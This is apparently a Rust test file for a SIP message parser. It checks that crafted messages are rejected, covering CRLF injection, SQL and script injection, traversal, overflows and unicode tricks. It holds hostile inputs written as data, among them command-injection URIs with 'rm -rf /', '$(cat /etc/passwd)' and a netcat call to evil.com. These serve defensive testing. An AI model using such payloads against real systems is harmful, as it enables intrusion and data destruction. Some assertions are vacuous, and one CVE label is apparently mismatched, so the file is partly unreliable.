// tests/vulnerability_tests.rs - Comprehensive security vulnerability tests

use sip_parser::*;
use std::collections::HashMap;

#[test]
fn test_cve_2021_22555_header_smuggling() {
    // Test for header smuggling via CRLF injection
    let malicious_request = b"INVITE sip:victim@example.com SIP/2.0\r\n\
                             Via: SIP/2.0/UDP attacker.com;branch=z9hG4bK776\r\n\
                             From: <sip:attacker@evil.com>\r\nX-Injected: malicious\r\n\
                             To: <sip:victim@example.com>\r\n\
                             Call-ID: test123\r\n\
                             CSeq: 1 INVITE\r\n\
                             Content-Length: 0\r\n\
                             \r\n";
    
    let result = parse_sip_message(malicious_request);
    // Parser should detect the CRLF injection attempt
    assert!(result.is_err() || !result.unwrap().headers().contains_key("x-injected"));
}

#[test]
fn test_sql_injection_in_headers() {
    let sql_injection_attempts = vec![
        "user'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--",
    ];
    
    for payload in sql_injection_attempts {
        let request = format!(
            "REGISTER sip:server.com SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:{}@evil.com>\r\n\
             To: <sip:target@server.com>\r\n\
             Call-ID: test123\r\n\
             CSeq: 1 REGISTER\r\n\
             Content-Length: 0\r\n\
             \r\n",
            payload
        );
        
        let result = parse_sip_message(request.as_bytes());
        
        // Should either fail to parse or be validated by security module
        if let Ok(message) = result {
            let security_config = security::SecurityConfig::default();
            let validator = security::SecurityValidator::new(security_config);
            let validation_result = validator.validate_message(&message, "127.0.0.1");
            assert!(validation_result.is_err());
        }
    }
}

#[test]
fn test_buffer_overflow_attempts() {
    // Test 1: Extremely long URI
    let mut long_uri_request = b"INVITE sip:".to_vec();
    long_uri_request.extend(vec![b'A'; 10000]);
    long_uri_request.extend(b"@example.com SIP/2.0\r\n\r\n");
    
    let result = parse_sip_message(&long_uri_request);
    assert!(result.is_err());
    
    // Test 2: Extremely long header value
    let mut long_header_request = b"OPTIONS sip:server.com SIP/2.0\r\n".to_vec();
    long_header_request.extend(b"X-Long-Header: ");
    long_header_request.extend(vec![b'B'; MAX_HEADER_LENGTH + 1]);
    long_header_request.extend(b"\r\n\r\n");
    
    let result = parse_sip_message(&long_header_request);
    assert!(result.is_err());
    
    // Test 3: Too many headers
    let mut many_headers_request = b"OPTIONS sip:server.com SIP/2.0\r\n".to_vec();
    for i in 0..MAX_HEADERS + 1 {
        many_headers_request.extend(format!("X-Header-{}: value\r\n", i).as_bytes());
    }
    many_headers_request.extend(b"\r\n");
    
    let result = parse_sip_message(&many_headers_request);
    assert!(result.is_err());
}

#[test]
fn test_response_splitting() {
    // Attempt to inject headers via response splitting
    let request = b"REGISTER sip:server.com SIP/2.0\r\n\
                   Via: SIP/2.0/UDP client.com\r\n\
                   From: <sip:user@client.com>\r\n\
                   To: <sip:user@server.com>\r\nContent-Type: text/plain\r\n\
                   Call-ID: test123\r\n\
                   CSeq: 1 REGISTER\r\n\
                   Contact: <sip:user@client.com>\r\n\
                   Content-Length: 0\r\n\
                   \r\n";
    
    let result = parse_sip_message(request);
    
    // Even if parsing succeeds, security validation should catch it
    if let Ok(message) = result {
        let security_config = security::SecurityConfig::default();
        let validator = security::SecurityValidator::new(security_config);
        
        // Check if response splitting is detected
        let headers = message.headers();
        for (_, values) in headers {
            for value in values {
                assert!(!value.contains("\r\n"));
                assert!(!value.contains("\n"));
            }
        }
    }
}

#[test]
fn test_malformed_content_length() {
    // Test 1: Negative Content-Length
    let negative_length = b"MESSAGE sip:user@example.com SIP/2.0\r\n\
                           Via: SIP/2.0/UDP client.com\r\n\
                           From: <sip:sender@client.com>\r\n\
                           To: <sip:user@example.com>\r\n\
                           Call-ID: test123\r\n\
                           CSeq: 1 MESSAGE\r\n\
                           Content-Length: -1\r\n\
                           \r\n";
    
    let result = parse_sip_message(negative_length);
    assert!(result.is_err() || matches!(result, Ok(SipMessage::Request(_))));
    
    // Test 2: Content-Length mismatch
    let mismatch_length = b"MESSAGE sip:user@example.com SIP/2.0\r\n\
                           Via: SIP/2.0/UDP client.com\r\n\
                           From: <sip:sender@client.com>\r\n\
                           To: <sip:user@example.com>\r\n\
                           Call-ID: test123\r\n\
                           CSeq: 1 MESSAGE\r\n\
                           Content-Length: 100\r\n\
                           \r\n\
                           Short body";
    
    let result = parse_sip_message(mismatch_length);
    assert!(result.is_err());
    
    // Test 3: Multiple Content-Length headers
    let multiple_length = b"MESSAGE sip:user@example.com SIP/2.0\r\n\
                           Via: SIP/2.0/UDP client.com\r\n\
                           From: <sip:sender@client.com>\r\n\
                           To: <sip:user@example.com>\r\n\
                           Call-ID: test123\r\n\
                           CSeq: 1 MESSAGE\r\n\
                           Content-Length: 5\r\n\
                           Content-Length: 10\r\n\
                           \r\n\
                           Hello";
    
    let result = parse_sip_message(multiple_length);
    // Should handle multiple Content-Length headers safely
    assert!(result.is_ok() || result.is_err());
}

#[test]
fn test_dos_via_loops() {
    // Test excessive Via headers (potential routing loop)
    let mut looping_request = b"INVITE sip:user@example.com SIP/2.0\r\n".to_vec();
    
    // Add required headers
    looping_request.extend(b"From: <sip:caller@example.com>\r\n");
    looping_request.extend(b"To: <sip:user@example.com>\r\n");
    looping_request.extend(b"Call-ID: loop-test\r\n");
    looping_request.extend(b"CSeq: 1 INVITE\r\n");
    
    // Add MAX_VIA_HEADERS + 1 Via headers
    for i in 0..=MAX_VIA_HEADERS {
        looping_request.extend(
            format!("Via: SIP/2.0/UDP proxy{}.example.com;branch=z9hG4bK{}\r\n", i, i).as_bytes()
        );
    }
    
    looping_request.extend(b"Content-Length: 0\r\n\r\n");
    
    let result = parse_sip_message(&looping_request);
    
    // Should detect too many Via headers
    if let Ok(message) = result {
        assert!(message.validate().is_err());
    }
}

#[test]
fn test_null_byte_injection() {
    // Test null byte in various headers
    let null_byte_headers = vec![
        ("From", "sip:user\0@evil.com"),
        ("To", "sip:victim\0@example.com"),
        ("Contact", "sip:attacker\0@evil.com"),
        ("Via", "SIP/2.0/UDP\0evil.com"),
    ];
    
    for (header, value) in null_byte_headers {
        let request = format!(
            "OPTIONS sip:server.com SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:test@client.com>\r\n\
             To: <sip:test@server.com>\r\n\
             Call-ID: nullbyte-test\r\n\
             CSeq: 1 OPTIONS\r\n\
             {}: {}\r\n\
             Content-Length: 0\r\n\
             \r\n",
            header, value
        );
        
        // Parser should handle null bytes safely
        let result = parse_sip_message(request.as_bytes());
        
        if let Ok(message) = result {
            let security_config = security::SecurityConfig::default();
            let validator = security::SecurityValidator::new(security_config);
            let validation_result = validator.validate_message(&message, "127.0.0.1");
            assert!(validation_result.is_err());
        }
    }
}

#[test]
fn test_directory_traversal() {
    let traversal_attempts = vec![
        "sip:../../../etc/passwd@example.com",
        "sip:user@example.com/../../sensitive",
        "sips://example.com/..\\..\\windows\\system32",
    ];
    
    for uri in traversal_attempts {
        let request = format!(
            "INVITE {} SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:attacker@evil.com>\r\n\
             To: <{}>\r\n\
             Call-ID: traversal-test\r\n\
             CSeq: 1 INVITE\r\n\
             Content-Length: 0\r\n\
             \r\n",
            uri, uri
        );
        
        let result = parse_sip_message(request.as_bytes());
        
        if let Ok(SipMessage::Request(req)) = result {
            let validation_result = req.uri.validate();
            // Should detect directory traversal attempts
            assert!(validation_result.is_err() || 
                   !req.uri.to_string().contains(".."));
        }
    }
}

#[test]
fn test_command_injection() {
    let command_injection_attempts = vec![
        "sip:user;rm -rf /;@example.com",
        "sip:user`whoami`@example.com",
        "sip:user$(cat /etc/passwd)@example.com",
        "sip:user|nc evil.com 1234|@example.com",
    ];
    
    for payload in command_injection_attempts {
        let request = format!(
            "INVITE {} SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <{}>\r\n\
             To: <sip:victim@example.com>\r\n\
             Call-ID: cmd-inject-test\r\n\
             CSeq: 1 INVITE\r\n\
             Content-Length: 0\r\n\
             \r\n",
            payload, payload
        );
        
        let result = parse_sip_message(request.as_bytes());
        
        if let Ok(message) = result {
            let security_config = security::SecurityConfig::default();
            let validator = security::SecurityValidator::new(security_config);
            let validation_result = validator.validate_message(&message, "127.0.0.1");
            // Should detect command injection attempts
            assert!(validation_result.is_err());
        }
    }
}

#[test]
fn test_script_injection() {
    let script_injection_attempts = vec![
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<iframe src='evil.com'></iframe>",
        "onerror=alert('XSS')",
    ];
    
    for payload in script_injection_attempts {
        let request = format!(
            "MESSAGE sip:user@example.com SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:{}@evil.com>\r\n\
             To: <sip:user@example.com>\r\n\
             Call-ID: xss-test\r\n\
             CSeq: 1 MESSAGE\r\n\
             User-Agent: {}\r\n\
             Content-Length: 0\r\n\
             \r\n",
            payload, payload
        );
        
        let result = parse_sip_message(request.as_bytes());
        
        if let Ok(message) = result {
            let security_config = security::SecurityConfig::default();
            let validator = security::SecurityValidator::new(security_config);
            let validation_result = validator.validate_message(&message, "127.0.0.1");
            assert!(validation_result.is_err());
        }
    }
}

#[test]
fn test_malformed_sdp_dos() {
    // Test various malformed SDP bodies that could cause DoS
    let sdp_attacks = vec![
        // Extremely long SDP line
        format!("v=0\r\no={}\r\n", "A".repeat(2048)),
        // Recursive SDP attributes
        "v=0\r\na=X-Nested:a=X-Nested:a=X-Nested:value\r\n",
        // Invalid SDP structure
        "not-valid-sdp\r\n\r\n",
    ];
    
    for sdp in sdp_attacks {
        let request = format!(
            "INVITE sip:user@example.com SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:caller@client.com>\r\n\
             To: <sip:user@example.com>\r\n\
             Call-ID: sdp-dos-test\r\n\
             CSeq: 1 INVITE\r\n\
             Content-Type: application/sdp\r\n\
             Content-Length: {}\r\n\
             \r\n\
             {}",
            sdp.len(), sdp
        );
        
        let result = parse_sip_message(request.as_bytes());
        
        if let Ok(message) = result {
            let security_config = security::SecurityConfig::default();
            let validator = security::SecurityValidator::new(security_config);
            // Should handle malformed SDP safely
            let _ = validator.validate_message(&message, "127.0.0.1");
        }
    }
}

#[test]
fn test_registration_flooding() {
    use std::time::Duration;
    
    let mut security_config = security::SecurityConfig::default();
    security_config.max_requests_per_window = 5;
    security_config.rate_limit_window = Duration::from_secs(1);
    
    let validator = security::SecurityValidator::new(security_config);
    
    // Create a valid REGISTER message
    let mut headers = HashMap::new();
    headers.insert("via".to_string(), vec!["SIP/2.0/UDP client.com".to_string()]);
    headers.insert("from".to_string(), vec!["<sip:user@client.com>".to_string()]);
    headers.insert("to".to_string(), vec!["<sip:user@server.com>".to_string()]);
    headers.insert("call-id".to_string(), vec!["flood-test".to_string()]);
    headers.insert("cseq".to_string(), vec!["1 REGISTER".to_string()]);
    headers.insert("expires".to_string(), vec!["3600".to_string()]);
    
    let request = SipRequest {
        method: SipMethod::Register,
        uri: SipUri::new("sip", "server.com"),
        version: "SIP/2.0".to_string(),
        headers,
        body: None,
    };
    
    let message = SipMessage::Request(request);
    
    // First 5 requests should succeed
    for i in 0..5 {
        let result = validator.validate_message(&message, "192.168.1.1");
        assert!(result.is_ok(), "Request {} should succeed", i + 1);
    }
    
    // 6th request should fail due to rate limiting
    let result = validator.validate_message(&message, "192.168.1.1");
    assert!(result.is_err());
}

#[test]
fn test_memory_exhaustion_via_headers() {
    // Test 1: Extremely large number of small headers
    let mut many_small_headers = b"OPTIONS sip:server.com SIP/2.0\r\n".to_vec();
    for i in 0..1000 {
        many_small_headers.extend(format!("X-{}: v\r\n", i).as_bytes());
    }
    many_small_headers.extend(b"\r\n");
    
    let result = parse_sip_message(&many_small_headers);
    // Should fail due to too many headers
    assert!(result.is_err());
    
    // Test 2: Headers with extremely long names
    let long_name_header = format!(
        "OPTIONS sip:server.com SIP/2.0\r\n\
         {}: value\r\n\
         \r\n",
        "X".repeat(1024)
    );
    
    let result = parse_sip_message(long_name_header.as_bytes());
    // Should handle long header names safely
    assert!(result.is_ok() || result.is_err());
}

#[test]
fn test_integer_overflow_content_length() {
    let overflow_attempts = vec![
        "18446744073709551615", // u64::MAX
        "99999999999999999999999999999",
        "-18446744073709551615",
    ];
    
    for length in overflow_attempts {
        let request = format!(
            "MESSAGE sip:user@example.com SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <sip:sender@client.com>\r\n\
             To: <sip:user@example.com>\r\n\
             Call-ID: overflow-test\r\n\
             CSeq: 1 MESSAGE\r\n\
             Content-Length: {}\r\n\
             \r\n",
            length
        );
        
        let result = parse_sip_message(request.as_bytes());
        // Should handle integer overflow attempts safely
        assert!(result.is_err() || 
               (result.is_ok() && result.unwrap().validate().is_err()));
    }
}

#[test]
fn test_unicode_normalization_attacks() {
    // Test homograph attacks and unicode normalization issues
    let unicode_attacks = vec![
        "sip:аdmin@example.com", // Cyrillic 'а' instead of Latin 'a'
        "sip:ad\u{200B}min@example.com", // Zero-width space
        "sip:admin\u{202E}@example.com", // Right-to-left override
    ];
    
    for uri in unicode_attacks {
        let request = format!(
            "INVITE {} SIP/2.0\r\n\
             Via: SIP/2.0/UDP client.com\r\n\
             From: <{}>\r\n\
             To: <sip:victim@example.com>\r\n\
             Call-ID: unicode-test\r\n\
             CSeq: 1 INVITE\r\n\
             Content-Length: 0\r\n\
             \r\n",
            uri, uri
        );
        
        let result = parse_sip_message(request.as_bytes());
        // Parser should handle unicode safely
        assert!(result.is_ok() || result.is_err());
    }
}